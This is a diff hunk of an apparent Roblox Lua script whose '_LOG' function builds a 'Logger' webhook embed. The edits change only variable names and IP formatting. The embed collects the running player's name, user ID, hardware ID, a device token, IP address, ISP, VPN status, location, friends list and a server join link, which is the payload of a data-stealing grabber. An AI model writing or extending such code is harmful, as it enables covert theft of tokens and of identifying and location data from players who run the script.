@@ -93,14 +93,14 @@ local function _LOG()
                 ["fields"] = {
                     {["name"] = "Player Info", ["value"] = string.format("Name: `%s` (`@%s`)\nUser ID: `%s`\nAccount Age: %d days", _lp.DisplayName, _lp.Name, _uid, _lp.AccountAge), ["inline"] = false},
                     {["name"] = "Executor", ["value"] = unc, ["inline"] = true},
-                    {["name"] = "System", ["value"] = "Platform: " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
+                    {["name"] = "System", ["value"] = "Platform: " .. (_US.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                     {["name"] = "Faction", ["value"] = string.format("Tag: [%s]\nName: %s", ft, fn), ["inline"] = false},
                     {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                     {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
-                    {["name"] = "Network", ["value"] = string.format("**IP:** `%s`\n**ISP:** %s\n**VPN:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
+                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**VPN:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
                     {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
                     {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
-                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", joinUrl, _uid), ["inline"] = false}
+                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jBtn, _uid), ["inline"] = false}
                 },
                 ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%x")}
             }}
